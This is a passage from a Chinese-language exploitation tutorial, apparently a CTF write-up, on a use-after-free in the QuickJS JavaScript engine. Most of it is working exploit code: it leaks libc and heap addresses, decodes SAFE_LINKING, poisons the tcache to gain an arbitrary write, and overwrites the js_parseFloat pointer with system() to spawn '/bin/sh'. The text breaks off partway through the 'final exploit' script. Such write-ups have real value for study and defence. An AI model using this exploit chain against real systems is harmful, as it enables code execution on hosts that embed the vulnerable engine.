    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] Arbitrary Read Capability:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can read freed memory via dangling TypedArray pointer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Successfully leaked heap metadata/pointers"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can potentially leak libc addresses"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can dump arbitrary memory regions"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[+] Arbitrary read primitive confirmed!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m  [✗] Read failed (no UAF):\x1b[0m "</span> + e.<span class="hljs-property">message</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>关键技术点：</strong></p>
<ol>
<li><strong>Unsorted Bin技巧</strong>：创建大块ArrayBuffer（0x800字节）并释放，会进入unsorted bin，其fd/bk指针指向libc中的main_arena</li>
<li><strong>UAF读取</strong>：通过悬空的TypedArray指针读取已释放chunk的内容，获取libc指针</li>
<li><strong>地址计算</strong>：根据已知偏移量计算libc基址和各种有用函数的地址</li>
</ol>
<h4 data-id="heading-22">实验3：任意地址写入验证</h4>
<p>结合tcache投毒技术，我们可以实现任意地址写入：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// arbitrary_write_verify.js - 验证任意写能力</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Arbitrary Write Capability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Technique: Tcache Poisoning"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段1: 地址泄露 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 1] Address leaking..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 复用前面的泄露技术</span>
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);

<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);

<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);
ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">const</span> libc_leak = ta1[<span class="hljs-number">0</span>];
<span class="hljs-keyword">const</span> libc_base = libc_leak - <span class="hljs-number">0x203b20n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Libc base leaked: "</span> + <span class="hljs-title function_">tohex</span>(libc_base));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段2: 堆地址泄露 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 2] Heap address leaking via tcache..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 创建合适大小的chunk进入tcache</span>
<span class="hljs-keyword">const</span> ab2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ArrayBuffer of size 0xa0"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] This size will use tcache bin"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">let</span> ab2_f = ab2.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta2_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2_f);
ab2_f = <span class="hljs-literal">null</span>;
ta2_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Freed the chunk via transfer()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Chunk entered tcache bin"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 读取tcache的next指针（经过SAFE_LINKING保护）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 3] Reading tcache metadata..."</span>);

<span class="hljs-keyword">const</span> heap_xor = ta2[<span class="hljs-number">0</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Raw tcache next (XORed): "</span> + <span class="hljs-title function_">tohex</span>(heap_xor));

<span class="hljs-comment">// SAFE_LINKING: next = (next_ptr &gt;&gt; 12) ^ heap_base</span>
<span class="hljs-comment">// 恢复真实堆地址</span>
<span class="hljs-keyword">const</span> heap_addr = heap_xor &lt;&lt; <span class="hljs-number">12n</span>;
<span class="hljs-keyword">const</span> heap_base = heap_addr - <span class="hljs-number">0x9000n</span> - <span class="hljs-number">0x14000n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Decoded heap address: "</span> + <span class="hljs-title function_">tohex</span>(heap_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Calculated heap base: "</span> + <span class="hljs-title function_">tohex</span>(heap_base));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 计算目标写入地址</span>
<span class="hljs-keyword">const</span> target_offset = <span class="hljs-number">0x3120n</span>;
<span class="hljs-keyword">const</span> target_addr = heap_base + target_offset;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Target write address: "</span> + <span class="hljs-title function_">tohex</span>(target_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      (This is where we want to allocate a chunk)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段4: Tcache投毒 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 4] Tcache poisoning attack..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 创建更多相同大小的chunk来操作tcache链</span>
<span class="hljs-keyword">const</span> ab3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3);

<span class="hljs-keyword">const</span> ab4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ab3 and ab4 (size 0xa0)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 释放它们进入tcache</span>
<span class="hljs-keyword">let</span> ab3_f = ab3.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta3_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab3_f);
ab3_f = <span class="hljs-literal">null</span>;
ta3_f = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">let</span> ab4_f = ab4.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta4_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab4_f);
ab4_f = <span class="hljs-literal">null</span>;
ta4_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Freed both chunks into tcache"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Tcache bin now has: ab4 -&gt; ab3 -&gt; ab2 -&gt; ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 关键：通过UAF修改ab4的next指针</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 5] Poisoning tcache next pointer..."</span>);

<span class="hljs-keyword">const</span> poisoned_next = target_addr ^ (heap_xor + <span class="hljs-number">0x00n</span>);
ta4[<span class="hljs-number">0</span>] = poisoned_next;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Original next: "</span> + <span class="hljs-title function_">tohex</span>(ta4[<span class="hljs-number">0</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Poisoned next: "</span> + <span class="hljs-title function_">tohex</span>(poisoned_next));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] After XOR decode, points to: "</span> + <span class="hljs-title function_">tohex</span>(target_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [!] Tcache chain now: ab4 -&gt; TARGET_ADDR -&gt; ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段6: 分配到目标地址 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 6] Allocating chunk at controlled address..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 第一次分配消耗ab4</span>
<span class="hljs-keyword">const</span> ab5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab5);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Allocated ab5 (consumes ab4 from tcache)"</span>);

<span class="hljs-comment">// 触发一个操作来稳定状态（可选，根据题目调整）</span>
<span class="hljs-keyword">let</span> dummy = ab2.<span class="hljs-property">resizable</span>;

<span class="hljs-comment">// 第二次分配会得到target_addr！</span>
<span class="hljs-keyword">const</span> ab6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta6 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab6);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Allocated ab6"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] ab6's backing store is at our target address!\x1b[0m"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段7: 验证写入能力 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 7] Verifying arbitrary write..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 写入测试数据</span>
<span class="hljs-keyword">const</span> magic1 = <span class="hljs-number">0xDEADBEEFCAFEBABEn</span>;
<span class="hljs-keyword">const</span> magic2 = <span class="hljs-number">0x1337133713371337n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Writing magic values..."</span>);
ta6[<span class="hljs-number">0</span>] = magic1;
ta6[<span class="hljs-number">1</span>] = magic2;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[0] = "</span> + <span class="hljs-title function_">tohex</span>(magic1));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[1] = "</span> + <span class="hljs-title function_">tohex</span>(magic2));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 读取验证</span>
<span class="hljs-keyword">const</span> read_back_0 = ta6[<span class="hljs-number">0</span>];
<span class="hljs-keyword">const</span> read_back_1 = ta6[<span class="hljs-number">1</span>];

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Reading back..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[0] = "</span> + <span class="hljs-title function_">tohex</span>(read_back_0));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta6[1] = "</span> + <span class="hljs-title function_">tohex</span>(read_back_1));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">if</span> (read_back_0 === magic1 &amp;&amp; read_back_1 === magic2) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] Write and read back successful!\x1b[0m"</span>);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;31m[✗] Values don't match!\x1b[0m"</span>);
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 阶段8: 构造复杂结构 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 8] Writing complex exploit structure..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">const</span> system_addr = libc_base + <span class="hljs-number">0x58750n</span>;
<span class="hljs-keyword">const</span> binsh_str_addr = heap_base + <span class="hljs-number">0x19c0n</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Computed addresses:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      system() = "</span> + <span class="hljs-title function_">tohex</span>(system_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      /bin/sh location = "</span> + <span class="hljs-title function_">tohex</span>(binsh_str_addr));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 初始化内存</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Initializing memory region..."</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ta6.<span class="hljs-property">length</span>; i++) {
    ta6[i] = <span class="hljs-number">1n</span>;
}

<span class="hljs-comment">// 构造fake对象结构（用于后续RIP劫持）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Writing exploit payload..."</span>);

ta6[<span class="hljs-number">0</span>] = binsh_str_addr;           <span class="hljs-comment">// 命令字符串指针</span>
ta6[<span class="hljs-number">1</span>] = <span class="hljs-number">0x51n</span>;                    <span class="hljs-comment">// chunk size字段</span>
ta6[<span class="hljs-number">2</span>] = <span class="hljs-number">0xc010000000002n</span>;         <span class="hljs-comment">// 对象flags</span>
ta6[<span class="hljs-number">3</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针1</span>
ta6[<span class="hljs-number">4</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针2</span>
ta6[<span class="hljs-number">6</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针3</span>
ta6[<span class="hljs-number">7</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针4</span>
ta6[<span class="hljs-number">8</span>] = heap_base + <span class="hljs-number">0x3178n</span>;      <span class="hljs-comment">// 链表指针5</span>
ta6[<span class="hljs-number">9</span>] = system_addr;              <span class="hljs-comment">// 函数指针 &lt;- 关键！</span>
ta6[<span class="hljs-number">11</span>] = <span class="hljs-number">0x68732f6e69622fn</span>;       <span class="hljs-comment">// "/bin/sh" 字符串内容</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Payload structure:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x00] String pointer: "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">0</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x08] Chunk size:     "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">1</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x10] Flags:          "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">2</span>]));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x48] Function ptr:   "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">9</span>]) + <span class="hljs-string">" &lt;- system()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      [0x58] String content: "</span> + <span class="hljs-title function_">tohex</span>(ta6[<span class="hljs-number">11</span>]) + <span class="hljs-string">" &lt;- '/bin/sh'"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// ================ 总结 ================</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] Arbitrary Write Capability:"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Leaked libc base address"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Leaked heap base address via SAFE_LINKING"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Poisoned tcache next pointer via UAF"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Allocated chunk at arbitrary address"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Successfully wrote controlled data"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Constructed exploit payload for RIP hijack"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[+] Arbitrary write primitive fully functional!\x1b[0m"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[+] Ready for control flow hijacking"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>关键技术点解析：</strong></p>
<ol>
<li>
<p><strong>SAFE_LINKING绕过</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">存储的next指针 = (真实next地址 &gt;&gt; 12) ^ (heap_base &gt;&gt; 12)

已知存储值heap_xor，恢复过程：
<span class="hljs-attr">heap_addr</span> = heap_xor &lt;&lt; <span class="hljs-number">12</span>
heap_base ≈ heap_addr - 偏移量

投毒时：
<span class="hljs-attr">poisoned</span> = target_addr ^ (heap_xor + adjustment)
</code></pre>
</li>
<li>
<p><strong>Tcache链操作</strong>：</p>
<pre><code class="hljs language-rust" lang="rust">初始状态: tcache <span class="hljs-punctuation">-&gt;</span> ab4 <span class="hljs-punctuation">-&gt;</span> ab3 <span class="hljs-punctuation">-&gt;</span> ab2 <span class="hljs-punctuation">-&gt;</span> ...

修改ab4<span class="hljs-punctuation">-&gt;</span>next = target_addr:
状态变化: tcache <span class="hljs-punctuation">-&gt;</span> ab4 <span class="hljs-punctuation">-&gt;</span> target_addr <span class="hljs-punctuation">-&gt;</span> ???

第一次malloc: 返回ab4，tcache <span class="hljs-punctuation">-&gt;</span> target_addr <span class="hljs-punctuation">-&gt;</span> ???
第二次malloc: 返回target_addr，我们控制的地址！
</code></pre>
</li>
<li>
<p><strong>内存布局</strong>：目标地址选择heap_base+0x3120，这里存储着QuickJS的关键数据结构，包括函数指针表</p>
</li>
</ol>
<h3 data-id="heading-23">完整利用链构造</h3>
<p>理解了读写原语后，我们来构造完整的exploit。</p>
<h4 data-id="heading-24">利用策略</h4>
<p>整个利用链的思路是：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. UAF触发
   ↓
<span class="hljs-number">2</span>. 泄露libc地址 (通过unsorted bin)
   ↓
<span class="hljs-number">3</span>. 泄露heap地址 (通过tcache SAFE_LINKING)
   ↓
<span class="hljs-number">4</span>. Tcache投毒指向目标地址
   ↓
<span class="hljs-number">5</span>. 分配到目标地址，获得任意写
   ↓
<span class="hljs-number">6</span>. 覆写函数指针为<span class="hljs-built_in">system</span>()
   ↓
<span class="hljs-number">7</span>. 构造RDI指向"/bin/sh"
   ↓
<span class="hljs-number">8</span>. 触发函数调用
   ↓
<span class="hljs-number">9</span>. getshell!
</code></pre>
<h4 data-id="heading-25">目标选择：js_parseFloat函数指针</h4>
<p>在QuickJS中，许多内置函数的指针存储在堆上的函数表中。通过分析，我们选择<code>js_parseFloat</code>作为劫持目标，原因：</p>
<ol>
<li><strong>位置固定</strong>：存储在heap_base+固定偏移处</li>
<li><strong>容易触发</strong>：调用<code>parseFloat()</code>即可</li>
<li><strong>参数可控</strong>：调用时RDI指向我们可控的字符串</li>
</ol>
<h4 data-id="heading-26">函数调用约定</h4>
<p>在x86-64 System V ABI中：</p>
<ul>
<li>RDI：第一个参数</li>
<li>RSI：第二个参数</li>
<li>RDX：第三个参数</li>
<li>...</li>
</ul>
<p>当我们劫持<code>js_parseFloat</code>为<code>system</code>后，调用<code>parseFloat(xxx)</code>时，RDI会指向参数字符串的地址。如果我们能让RDI指向"/bin/sh"，就能执行<code>system("/bin/sh")</code>。</p>
<h4 data-id="heading-27">最终Exploit</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}
vlog = <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tohex</span>(x));
<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);
<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);
ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;
libc_addr = ta1[<span class="hljs-number">0</span>] - <span class="hljs-number">0x203b20n</span>;
fstderr = libc_addr + <span class="hljs-number">0x2044e0n</span>;
system = libc_addr + <span class="hljs-number">0x58750n</span>;
<span class="hljs-keyword">const</span> ab2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2);
<span class="hljs-keyword">let</span> ab2_f = ab2.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta2_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab2_f);
ab2_f = <span class="hljs-literal">null</span>;
ta2_f = <span class="hljs-literal">null</span>;
heap_xor = ta2[<span class="hljs-number">0</span>];
heap_addr = ta2[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">12n</span>;
heap_base = heap_addr - <span class="hljs-number">0x9000n</span> - <span class="hljs-number">0x14000n</span>;
map_addr = heap_base + <span class="hljs-number">0x3120n</span>;
<span class="hljs-keyword">const</span> ab3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0xa0</span>);
